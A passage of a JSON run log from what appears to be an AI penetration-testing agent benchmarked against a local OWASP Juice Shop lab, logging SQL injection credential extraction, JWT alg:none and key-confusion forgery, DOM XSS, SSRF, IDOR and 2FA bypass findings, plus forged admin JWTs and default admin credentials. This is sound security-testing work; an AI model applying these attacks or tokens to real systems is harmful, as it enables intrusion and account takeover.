+    "auth_session:raw Let me start by understanding the current state. I have:\n\n1. Target: http://127.0.0.1:3011\n2. Actors: anon (no session), actor_a (registered as test@test.com), actor_b (admin logged in as admin@juice-sh.op/admin123)\n3. Various surfaces already discovered\n\nThe `auth_session` stage requires me to:\n1. Login differential (valid vs invalid) - already seems partially done\n2. Register / mass-assignment on create-user if register surface exists\n3. JWT: try alg:none accept proof when JWT present\n4. Light probe for reset/2fa surfaces\n5. Store tokens with actor_set_token\n\nLet me start by examining what tokens exist for actors, check login differential, and test JWT alg:none.\n\nLet me first check the current JWT tokens and session behavior.\nLooking at the current state, I have actors with sessions already established. Let me systematically execute the `auth_session` stage by:\n\n1. Examining login differential (valid vs invalid)\n2. Testing JWT alg:none attack\n3. Checking session behavior\n4. Probing register surface for mass assignment\n5. Exploring reset/2fa surfaces\n\nLet me start by checking current tokens and sessions.\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\nGood. So:\n- actor_a (test@test.com) - id=24\n- actor_b (admin@juice-sh.op) - id=1\n- Invalid login returns 401 - login differential exists\n\nNow let me check the JWT tokens being used. Let me decode them to see the claims.\nGood. Login differential confirmed: valid credentials return 200 with user object, invalid return 401. Let me now examine the JWT tokens and test alg:none attacks.\n[tool_call:http_request]\nThe request I sent had a fake JWT in the Authorization header, but since actor_a was used, the sandbox likely used the stored cookie for actor_a instead of my custom header. Let me try to get the actual token from actor_a's session, or use anon with a custom header.\nLet me check the JWT tokens by inspecting the response headers and also test with anon actor.\n[tool_call:http_request]\nSo \"tes",
+    "feedback[evidence] auth_session: ok ready=0",
+    "feedback[discovery_yield] auth_session: ok ready=0 tools=47",
+    "feedback[structure] auth_session: fail no parseable JSON",
+    "feedback[tool_use] auth_session: ok calls=47",
+    "auth_session: live complete tools=120 structured=False surfaces=55",
+    "class_probe: begin",
+    "agent_graph: fan-out packages=['class_probe/pentest-xss-dom', 'class_probe/pentest-api', 'class_probe/pentest-sql-injection', 'class_probe/pentest-authz-logic', 'class_probe/pentest-auth-session', 'class_probe/pentest-component-rce', 'class_probe/pentest-file-upload', 'class_probe/pentest-ssrf'] eff_workers=8 forced=['pentest-sql-injection', 'pentest-ssrf', 'pentest-xss', 'pentest-component-rce'] path_map=[('pentest-xss', ['/rest/products/search', '/rest/products/{id}/reviews', '/api/Feedbacks', '/rest/products/reviews']), ('pentest-api', ['/api/products', '/api/products/{id}', '/api/challenges']), ('pentest-sql-injection', ['/rest/products/search']), ('pentest-authz-logic', ['/api/users', '/api/users/{id}', '/rest/basket/{id}', '/api/orders', '/rest/order-history', '/rest/user/security-question', '/rest/basket']), ('pentest-auth-session', ['/rest/user/login', '/rest/user/whoami', '/rest/memories', '/rest/admin/application-configuration', '/rest/user/register', '/rest/user/reset-password', '/rest/user/change-password', '/api/users/whoami']), ('pentest-component-rce', ['/encryptionkeys', '/support/logs', '/actuator', '/actuator/health']), ('pentest-file-upload', ['/robots.txt', '/ftp', '/assets/public/images/uploads']), ('pentest-ssrf', ['/profile/image/url', '/profile/image/file'])]",
+    "agent_graph: start class_probe/pentest-xss-dom paths=['/rest/products/search', '/rest/products/{id}/reviews', '/api/Feedbacks', '/rest/products/reviews']",
+    "agent_graph: start class_probe/pentest-api paths=['/api/products', '/api/products/{id}', '/api/challenges']",
+    "agent_graph: start class_probe/pentest-sql-injection paths=['/rest/products/search']",
+    "agent_graph: start class_probe/pentest-authz-logic paths=['/api/users', '/api/users/{id}', '/rest/basket/{id}', '/api/orders', '/rest/order-history', '/rest/user/security-question', '/rest/basket']",
+    "agent_graph: start class_probe/pentest-auth-session paths=['/rest/user/login', '/rest/user/whoami', '/rest/memories', '/rest/admin/application-configuration', '/rest/user/register', '/rest/user/reset-password', '/rest/user/change-password', '/api/users/whoami']",
+    "agent_graph: start class_probe/pentest-component-rce paths=['/encryptionkeys', '/support/logs', '/actuator', '/actuator/health']",
+    "agent_graph: start class_probe/pentest-file-upload paths=['/robots.txt', '/ftp', '/assets/public/images/uploads']",
+    "agent_graph: start class_probe/pentest-ssrf paths=['/profile/image/url', '/profile/image/file']",
+    "agent_graph: class_probe/pentest-file-upload truncated at max_events=96",
+    "class_probe: ref_read attempted vulns/xss-dom-client.md but file not found in pack; used skill pentest-xss methodology and payloads/xss.md reference",
+    "class_probe: Tested assigned paths: /rest/products/search (API returns JSON, no reflection), /rest/products/{id}/reviews (GET works), /api/Feedbacks (GET returns stored feedbacks with HTML - potential stored XSS if POST works with auth), /rest/products/reviews (HTTP 500)",
+    "class_probe: DOM XSS confirmed in SPA route /#/search?q= via browser open_eval with execution proof (document.title changed via injected JS, cookies accessed)",
+    "class_probe: Feedback POST endpoint requires authentication (HTTP 401) — attempted with CAPTCHA but 401; stored XSS in feedbacks not tested",
+    "class_probe: No CSP header found, allowing easy script execution",
+    "class_probe: Coverage gaps for SQL injection, SSRF, JWT, GraphQL, identity reset/change are not in XSS worker scope",
+    "class_probe:summary Found DOM-based XSS in SPA search route. The #/search?q= parameter is injected into innerHTML without sanitization, allowing arbitrary JavaScript execution via event handlers like onerror.",
+    "class_probe: identity-merge updated 2 existing candidate(s)",
+    "class_probe: Refs read: refs/payloads/api.md (BOLA/mass assignment patterns), refs/payloads/access-control.md (IDOR/BFLA patterns)",
+    "class_probe: COVERAGE GAP injection_search: Confirmed SQL injection in /rest/products/search with UNION-based extraction of all user credentials (email:password_hash:role). Full database schema and table enumeration achieved.",
+    "class_probe: COVERAGE GAP jwt_key_material: Confirmed /encryptionkeys directory listing with jwt.pub (RSA public key) and premium.key exposed. Enables JWT algorithm confusion attack.",
+    "class_probe: Assigned exclusive paths probed: /api/products (GET, POST, PUT, DELETE), /api/products/{id} (GET, PUT, DELETE), /api/challenges (GET).",
+    "class_probe: Surface /api/challenges/{id} (GET) requires authentication (401) but the list endpoint /api/challenges does not.",
+    "class_probe: DELETE /api/products/1 and POST /api/challenges both return 401 Unauthorized, indicating write-protection on those operations.",
+    "class_probe: GraphQL endpoints (/graphql, /api/graphql) not found or not functional (return SPA HTML or 500).",
+    "class_probe: JWT stored for actor 'admin': RS256-signed token for admin@juice-sh.op acquired via POST /rest/user/login with password admin123.",
+    "class_probe: POST /rest/user/change-password returned 500 in all tested configurations (empty current password, with auth). Could not confirm the empty-password bypass vulnerability.",
+    "class_probe: allow_postex=false respected — no post-exploitation actions performed.",
+    "class_probe: Operator: hvn5-juice-node5-20260724T003348Z",
+    "class_probe:summary Probed assigned API surfaces on http://127.0.0.1:3011. Confirmed SQL injection in /rest/products/search (UNION-based data extraction of all users/password hashes), mass assignment privilege escalation via POST /api/Users with role=admin, missing auth on product CRUD (POST/PUT /api/products without token), excessive data exposure via /api/challenges endpoint, JWT public key leakage at /encryptionkeys/jwt.pub, directory listing on /encryptionkeys/, and security question enumeration via /rest/user/security-question. Cover gap SQLi and JWT key material confirmed.",
+    "class_probe: identity-merge updated 1 existing candidate(s)",
+    "class_probe: ref_read: payloads/access-control.md — Dual-actor IDOR patterns methodology used for basket/user ID testing",
+    "class_probe: Assigned exclusive paths tested: /api/users, /api/users/{id}, /rest/basket/{id}, /api/orders (500), /rest/order-history, /rest/user/security-question, /rest/basket (500)",
+    "class_probe: Coverage gap identity_change_password partially covered — change-password endpoint is at /rest/user/change-password which is not in my exclusive paths list, but the empty-current bypass was discovered during testing",
+    "class_probe: COVERAGE GAP notes: injection_search (/rest/products/search), ssrf_url_sink (/profile/image/url, /profile/image/file), jwt_key_material (/encryptionkeys), graphql (/graphql, /api/graphql) not tested as they are outside assigned paths for this worker",
+    "class_probe: Some users had null email (registration endpoint not saving email properly)",
+    "class_probe: Order placed on basket/1 had product named 'hacked' at price 0.01 — appears to be prior worker manipulation of basket data",
+    "class_probe: POST /rest/basket/1/checkout succeeded without auth and created real orders visible in order-history",
+    "class_probe:summary Probed all assigned authorization paths on Juice Shop. Found 7 distinct authorization vulnerabilities: (1) Unauthenticated /api/users leaks all user records; (2) Unauthenticated /api/users/{id} leaks individual user data; (3) Unauthenticated /rest/basket/{id} allows viewing any user's basket; (4) Unauthenticated POST /rest/basket/{id}/checkout allows placing orders on any basket; (5) Unauthenticated /rest/order-history leaks all orders; (6) Unauthenticated /rest/user/security-question?email= leaks security questions; (7) Empty-current-password bypass in /rest/user/change-password changes admin password and leaks full user record including password hash.",
+    "class_probe: identity-merge updated 1 existing candidate(s)",
+    "class_probe: Probed assigned paths: /encryptionkeys, /support/logs, /actuator, /actuator/health",
+    "class_probe: /actuator and /actuator/health return SPA index.html (not actual actuator JSON endpoints)",
+    "class_probe: /actuator/env, /actuator/beans, /actuator/mappings also return SPA (no spring actuator available)",
+    "class_probe: JWT algorithm confusion (CVE-2015-9235 / CVE-2016-5431) proven: HS256 signed with RSA public key accepted",
+    "class_probe: alg:none attack also accepted by the server",
+    "class_probe: jwt_key_material coverage gap addressed: key file at /encryptionkeys + server ACCEPTANCE of forged signed token",
+    "class_probe: premium.key may be used for deluxe membership token validation",
+    "class_probe:summary Probed assigned paths on OWASP Juice Shop at 127.0.0.1:3011. Found directory listing on /encryptionkeys and /support/logs exposing JWT public key, premium key, access logs, and audit config. Performed JWT algorithm confusion attack (HS256 with RSA public key as HMAC secret) and alg:none attack, both accepted by the server granting full admin access. Successful JWT key confusion proof with server acceptance of forged signed token.",
+    "class_probe:class_probe/pentest-file-upload: unstructured raw_chars=25198",
+    "class_probe:class_probe/pentest-file-upload:raw Thought: I'm the class_probe/pentest-file-upload worker for Node5. My skill is pentest-file-upload. Target: http://127.0.0.1:3011. Assigned paths: /robots.txt, /ftp, /assets/public/images/uploads.\n\nI need to:\n1. Read assigned vuln details (catalog ids) if any for file upload. The instruction says \"no path-matched catalog ids for this skill — ref_query if needed\". I can ref_query for file upload patterns.\n2. Probe the three assigned paths.\n3. Look for upload surfaces (likely there's an upload feature somewhere). Since my skill is file upload, I should look for upload forms/APIs.\n4. Check coverage gaps: there are several listed but they are for other skills (injection_search, ssrf_url_sink, jwt_key_material, graphql, identity_reset, identity_change_password). Those are not my skill. My focus",
+    "class_probe: ref_read attempted: vulns/ssrf-url-fetch.md not found",
+    "class_probe: ref_read: payloads/ssrf.md - SSRF patterns reference",
+    "class_probe: Assigned paths: /profile/image/url, /profile/image/file (both confirmed functional)",
+    "class_probe: /profile/image/url accepts POST with imageUrl form param; stores URL and triggers server-side fetch",
+    "class_probe: /profile/image/file requires multipart file upload (400 for form-encoded)",
+    "class_probe: User 24 (test@test.com) profileImage was automatically converted from URL to local file assets/public/images/uploads/24.jpg, confirming server-side HTTP fetch",
+    "class_probe: Coverage gaps addressed: ssrf_url_sink confirmed with server-side fetch proof",
+    "class_probe:summary Proven SSRF via /profile/image/url endpoint. The server accepts an arbitrary URL via POST parameter 'imageUrl', stores it in the database, dynamically includes it in the CSP img-src header, and server-side fetches the URL, saving the response locally as assets/public/images/uploads/{userId}.{ext}. This allows internal network scanning and access to sensitive endpoints like /rest/admin/application-configuration (which exposes full config including JWT keys, OAuth secrets, etc.).",
+    "class_probe: agent_graph join workers=8 structured=7 tools=488 new_candidates=13",
+    "identity_chain: begin catalog=totp-2fa reason=2fa_signal",
+    "feedback[identity_chain] class_probe: ok start id=totp-2fa reason=2fa_signal",
+    "class_probe: ref_read attempted for vulns/totp-2fa.md but file not found in knowledge base",
+    "class_probe: Ref_list used to discover available knowledge references",
+    "class_probe: Catalog id=totp-2fa tested: reached S3 checkpoint - 2FA bypass completed",
+    "class_probe: chain_stop=S3 - full 2FA bypass chain executed: register→login→setup→generate TOTP→verify→whoami",
+    "class_probe: Coverage gaps probed: /graphql returns SPA HTML (not GraphQL endpoint), /api/graphql returns 500, /socket.io/ returns 400",
+    "class_probe: Probed paths: /api/Users (POST 201), /api/Users/{id} (GET 200), /rest/user/login (POST 200/401), /rest/user/whoami (GET 200), /rest/memories (GET 200 - data leak), /.well-known/security.txt (GET 200), /rest/2fa/status (GET 200 - secret leak), /rest/2fa/setup (POST 200 after correct params), /rest/2fa/verify (POST 200)",
+    "class_probe: Password required as plaintext for setup call; initialToken is the 6-digit TOTP generated from the QR secret",
+    "class_probe:summary Completed full 2FA identity chain (totp-2fa) on Juice Shop. Reached S3 checkpoint: registered fresh user, enabled 2FA, generated TOTP from exposed secret, verified, and proved authenticated session. Additionally discovered unauthenticated secret exposure via /rest/2fa/status and password hash leakage via /rest/memories.",
+    "identity_chain: pass=0 tools=56 new_cands=3 catalog=totp-2fa",
+    "identity_chain: pass=0 observed S3 signals tools=56",
+    "feedback[identity_chain] class_probe: ok pass=0 tools=56 new_cands=3 id=totp-2fa",
+    "identity_chain: no continue (S3 done or no half-step/force)",
+    "identity_chain: finished catalog=totp-2fa total_tools=56",
+    "class_probe: promoted 2 quality-ok candidate(s) to ready_to_book",
+    "feedback[evidence] class_probe: ok ready=15",
+    "feedback[discovery_yield] class_probe: ok new_cands=16 ready=15 structured_workers=7",
+    "feedback[injection_depth] class_probe: ok sqli_cands=1 deep=1",
+    "feedback[coverage] class_probe: ok deferred_to_coverage_probe untested=['graphql', 'upload', 'xss_self_inject', 'dom_client', 'websocket']",
+    "feedback[structure] class_probe: ok json_ok",
+    "feedback[tool_use] class_probe: ok calls=544",
+    "feedback[coverage] class_probe: ok new_candidates=16",
+    "class_probe: live complete tools=544 structured=True",
+    "authz_logic: begin",
+    "coverage[authz_matrix] attempted matrix_start",
+    "authz_matrix: cells=23 diffs=4 write_tried=True http=23",
+    "coverage[authz_matrix] closed matrix differential booked Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET bo",
+    "authz_matrix: pre-llm cells=23 booked=True http=23",
+    "coverage: injected 6 lines for stage authz_logic",
+    "authz_logic: no structured JSON; kept raw note",
+    "authz_logic:raw Let me analyze the current state and plan my approach.\n\nFirst, let me understand what's already been done and what still needs to be done for this authz_logic stage.\n\nThe key requirements from the stage description:\n1. Create Actor A and Actor B (two users)\n2. From resources, pick user/admin-sensitive objects\n3. MATRIX per resource: A creates/owns → B GET/PUT/DELETE same id → anon GET\n4. ready_to_book ONLY with dual-actor or unauth vs auth differential\n5. Do NOT only report \"GET /api/X returns array\" without naming actors\n\nI already have:\n- actor_a: test@test.com (customer) - registered\n- actor_b: admin@juice-sh.op (admin) - logged in with admin123\n- anon: no session\n\nLet me check what sessions/tokens I have set up.\n\nI need to:\n1. Verify actors are properly set up with tokens\n2. Find sensitive resources to test cross-actor access\n3. Run dual-actor matrix tests\n\nLet me start by checking what tokens I have and setting them up properly.\n\nBut first, let me think about the key authz tests I should run:\n\nResources to test:\n- /api/users/{id} - user profile access (cross-actor)\n- /rest/basket/{id} - basket access\n- /api/orders - orders\n- /rest/memories - memories\n- /rest/order-history - order history\n- /api/feedbacks - feedbacks\n\nKey tests:\n1. A creates resource → B tries to access/modify/delete → anon tries\n2. Low-priv accesses admin-only endpoints\n\nLet me check my actor tokens first.\nI'll execute the authz_logic stage systematically. Let me start by checking the state of my actors and then perform dual-actor differential tests.\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\nInteresting - both actor_a and actor_b are returning as admin@juice-sh.op. This means the JWT tokens got confused. Let me re-setup the actors properly. I need to:\n\n1. Register a fresh user for actor_a\n2. Login as admin for actor_b (already done)\n3. Keep anon as is\n\nLet me register a new user for actor_a first.\nI see the actors need to be properly set up. Both are showing as ",
+    "feedback[evidence] authz_logic: ok ready=1",
+    "feedback[authz_coverage] authz_logic: ok sens=29 authz_cands=1",
+    "feedback[structure] authz_logic: fail no parseable JSON",
+    "feedback[tool_use] authz_logic: ok calls=36",
+    "feedback[retry] authz_logic: ok JSON/ledger/discovery retry: ['no parseable JSON']",
+    "coverage: injected 6 lines for stage authz_logic",
+    "authz_logic: no structured JSON; kept raw note",
+    "authz_logic:raw The user wants me to execute the `authz_logic` stage on the target. This is a pentest authorization logic test. Let me review what I know:\n\n- Target: http://127.0.0.1:3011\n- Stage: authz_logic\n- Success criteria: authz/logic differential with dual-actor proof\n\nI have some existing context:\n- Actors: anon, actor_a (registered as test@test.com), actor_b (admin@juice-sh.op / admin123)\n- There are many candidates already found from previous stages\n\nThe instructions say:\n1. Dual-actor attempt required: register/login two users if possible, cross-access object IDs, book only differentials\n2. If truly impossible, notes=['skip: dual-actor failed'] and empty candidates\n\nI already have actors available. Let me do dual-actor testing on resources that have user-specific/sensitive data. The key resources to test would be:\n\n1. Basket (IDOR) - Actor A creates/owns a basket, Actor B tries to access it\n2. Orders\n3. Users\n4. Feedbacks\n5. Reviews\n\nLet me start by doing dual-actor tests. I need to:\n1. Register two users (or use existing ones)\n2. Login as each\n3. Cross-access resources\n\nI already have actor_a (test@test.com) and actor_b (admin@juice-sh.op). Let me first check what tokens they have, then do cross-access tests.\n\nLet me start by testing dual-actor scenarios.\nI'll now execute the `authz_logic` stage with dual-actor testing. Let me first check the existing actor tokens and then perform cross-access tests.\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\nInteresting! So:\n- actor_a is a regular user (id=44, email=customer_a@test.com) - already registered\n- actor_b is admin (id=1, email=admin@juice-sh.op) - already logged in\n- anon also shows user id=1 (admin) - this is weird... actually the /rest/user/whoami endpoint seems to return the admin user even for anon? That's a vulnerability itself.\n\nWait, the anon response shows user id=1 (admin). That could be because the endpoint defaults to some user when no session is provided. That's interesting.\n\nBut ",
+    "feedback[evidence] authz_logic: ok ready=1",
+    "feedback[authz_coverage] authz_logic: ok sens=29 authz_cands=1",
+    "feedback[structure] authz_logic: fail no parseable JSON",
+    "feedback[tool_use] authz_logic: ok calls=18",
+    "authz_logic: soft-complete without structured JSON (bounded); continuing Task Graph",
+    "feedback[authz_soft_skip] authz_logic: ok no dual-actor structured result",
+    "authz_logic: live complete tools=54 structured=False surfaces=60",
+    "component: begin",
+    "coverage: injected 6 lines for stage component",
+    "component: identity-merge updated 10 existing candidate(s)",
+    "component: catalog_considered: [jwt-algorithm-confusion, ssrf-url-fetch, idor, mass-assignment, sql-injection, dom-xss, disclosure, auth-bypass, file-upload, websocket]",
+    "component: Component identified: OWASP Juice Shop (Node.js/Express) - version 20.1.1",
+    "component: Stack fingerprint: Node.js v24.17.0, Express ^4.22.1, Angular SPA, SQLite 3.44.2, prom-client metrics",
+    "component: JWT attack successfully proved - both alg:none and algorithm confusion (RS256→HS256 with public key) accepted",
+    "component: DOM XSS proved via browser tool on search q parameter",
+    "component: WebSocket/Socket.IO confirmed at /socket.io/ with WebSocket upgrade",
+    "component: File upload works for allowed image types (image/png, jpeg, gif) but blocks SVG and HTML",
+    "component: GraphQL endpoints (/graphql, /api/graphql) not functional as GraphQL - serve SPA or return 500",
+    "component: All critical findings have ready_to_book=true with tool-proven proof excerpts",
+    "component:summary Stage component complete. Confirmed OWASP Juice Shop (Node.js/Express v4.22.1, Angular SPA). Performed JWT algorithm confusion attack (alg:none + HS256 with RSA public key as HMAC secret) both accepted by server returning admin identity. DOM XSS confirmed via browser on search q parameter. File upload confirmed at /profile/image/file (validated by type, image/* accepted). WebSocket/socket.io confirmed. Multiple unauthenticated API endpoints found. Version 20.1.1.",
+    "feedback[evidence] component: ok ready=2",
+    "feedback[structure] component: ok json_ok",
+    "feedback[tool_use] component: ok calls=55",
+    "component: live complete tools=55 structured=True surfaces=62",
+    "feedback[dedupe] validate_book: ok suppressed_duplicate_candidates=2 unique=22",
+    "validate_book: identity dedupe 24 → 22 (suppressed 2)",
+    "validate_book: quality skip [xss_no_own_injection] DOM XSS in search functionality via unsafe innerHTML",
+    "validate_book: quality skip [meta_scoreboard_or_progress] Excessive Data Exposure on /api/challenges",
+    "validate_book: quality skip [no_tool_effect] Directory Listing - Log File Exposure",
+    "feedback[evidence] validate_book: ok booked=15 skipped_weak_or_incomplete_or_surface=7",
+    "feedback[evidence_quality] validate_book: ok quality_fail=3 prior_defer=0 booked=15",
+    "validate_book: booked 15 unique finding(s) from 22 candidates (surface rows not bookable)",
+    "feedback[coverage] finalize: fail untested=['graphql', 'upload', 'xss_self_inject', 'dom_client', 'websocket'] attempt_rate=0.643",
+    "feedback[discovery_yield] finalize: fail structure_fail_n=5 discovery_soft_fail_n=1 stages=['prior_reverify'] ready_by_stage={'surface': 0, 'prior_reverify': 0, 'auth_session': 0, 'class_probe': 15, 'authz_logic': 1, 'component': 2}",
+    "finalize: stages_done=['init', 'surface', 'prior_reverify', 'auth_session', 'class_probe', 'authz_logic', 'component', 'validate_book', 'finalize'] findings=15 surfaces=62 resources=33 actors=3 candidates=22 coverage_ledger=2 cov_attempt_rate=0.643 cov_close_rate=1.0 untested=['graphql', 'upload', 'xss_self_inject', 'dom_client', 'websocket'] process_structure_fail=5 process_discovery_soft_fail=1 errors=0 feedback_ok=42 feedback_fail=8 cookies=['token'] actor_jars=['actor_a', 'actor_b', 'actor_forged', 'anon', 'admin', 'user_a'] agent_packages=['class_probe/pentest-xss-dom', 'class_probe/pentest-api', 'class_probe/pentest-sql-injection', 'class_probe/pentest-authz-logic', 'class_probe/pentest-auth-session', 'class_probe/pentest-component-rce', 'class_probe/pentest-file-upload', 'class_probe/pentest-ssrf'] forced=['pentest-sql-injection', 'pentest-ssrf', 'pentest-xss', 'pentest-component-rce'] eff_workers=8 findings_with_precondition=6",
+    "finalize: wrote /mnt/d/Coding/my-ai-pen/benchmarks/hard-vs-node5/runs/20260724T003348Z/juice/node5/work/state.json findings.json summary.json"
+  ],
+  "errors": [],
+  "dry_run": false,
+  "model": "deepseek-v4-flash",
+  "pack_root": "/mnt/d/Coding/my-ai-pen/experts/pentest",
+  "work_dir": "/mnt/d/Coding/my-ai-pen/benchmarks/hard-vs-node5/runs/20260724T003348Z/juice/node5/work",
+  "max_shell_chars": 12000,
+  "operator_notes": "hvn5-juice-node5-20260724T003348Z authorized app_assessment local lab only; scope 127.0.0.1/localhost; no off-box post-ex; no answer keys",
+  "only_stages": [],
+  "cookies": {
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNCwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJwYXNzd29yZCI6IjE2ZDdhNGZjYTc0NDJkZGEzYWQ5M2M5YTcyNjU5N2U0Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0yNCAwMToxMjoyMi4xMzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0yNCAwMToxMjoyMi4xMzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo2LCJpYXQiOjE3ODQ4NTU1NDl9.WMu4f7v_O5ergFW4wc18Y15ZQGNDZWjngIphNYeyvjTY3wtHzyipzfNP5Ib4j9rDKTsGUuAe8Z4sv_bcEF27xsv77QdZOl_o9DtQ70uw5PcrAKol1TQ-uxb_lVB9jM9cpCbKy9iNoZuu648Vxaz-qBS0NGUaZYUdbgGVXEKbZnI"
+  },
+  "actor_cookies": {
+    "actor_a": {
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo0NCwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImN1c3RvbWVyX2FAdGVzdC5jb20iLCJwYXNzd29yZCI6IjMyMjUwMTcwYTBkY2E5MmQ1M2VjOTYyNGYzMzZjYTI0Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0yNCAwMTo1MTo0Mi44ODYgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0yNCAwMTo1MTo0Mi44ODYgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxMCwiaWF0IjoxNzg0ODU3OTA4fQ.JlsQyL4MM3Pa6FtdYojGEm0BWXMyMvOl1rjSQnsgLLO6NOW5wkTYhxn947reu91RCcJmtXTevdFKXF5ae5Zq3Ty5kgdyX4cvb-h9k4O_1do9sW2QKlsZPkXJboRe7dLRo4JhJamz0xoL2ZW6MaSUCvf8pQsH5ETWfoqLOnTcHQ0"
+    },
+    "actor_b": {
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6Imh0dHA6Ly8xMjcuMC4wLjE6MzAxMS9mdHAvYWNxdWlzaXRpb25zLm1kIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTI0IDAxOjEwOjQxLjQ3NSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTI0IDAxOjQzOjA1LjA1NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30.GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs"
+    },
+    "actor_forged": {
+      "token": "eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJkYXRhIjogeyJpZCI6IDEsICJ1c2VybmFtZSI6ICIiLCAiZW1haWwiOiAiYWRtaW5AanVpY2Utc2gub3AiLCAicGFzc3dvcmQiOiAiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCAicm9sZSI6ICJhZG1pbiIsICJkZWx1eGVUb2tlbiI6ICIiLCAibGFzdExvZ2luSXAiOiAiIiwgInByb2ZpbGVJbWFnZSI6ICJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCAidG90cFNlY3JldCI6ICIiLCAiaXNBY3RpdmUiOiB0cnVlLCAiY3JlYXRlZEF0IjogIjIwMjYtMDctMjQgMDE6MTA6NDEuNDc1ICswMDowMCIsICJ1cGRhdGVkQXQiOiAiMjAyNi0wNy0yNCAwMToxMDo0MS40NzUgKzAwOjAwIiwgImRlbGV0ZWRBdCI6IG51bGx9LCAiYmlkIjogMSwgImlhdCI6IDE3ODQ4NTYwMzJ9.PrNHSMgBzMn91vjzfQLqybHUHID-9QdDr6sGqOGk6Z0"
+    },
+    "anon": {
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0sImJpZCI6MX0.UEpF16vnthh5y38aslTfz_n8jxkGOvVPg9RwkaaRoAA"
+    },
+    "admin": {
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0yNCAwMToxMDo0MS40NzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0yNCAwMToxMDo0MS40NzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQ4NTY5ODF9.wlhNWe6cY777i0A8WZ5NwcahOu55jadNWUGWRlPg173mciFAiSeyGze1B_fJbjKVN1qYKF3_vpejAyDwD3f1rsXRdXXPFXDcQvBTmC4dDsQRv9KHIYu3EIo_5sjxHu5tPfIO7GgNEfJJSd1jZxC6WALHodDOx-d-JiRHkvkD4zM"
+    },
+    "user_a": {
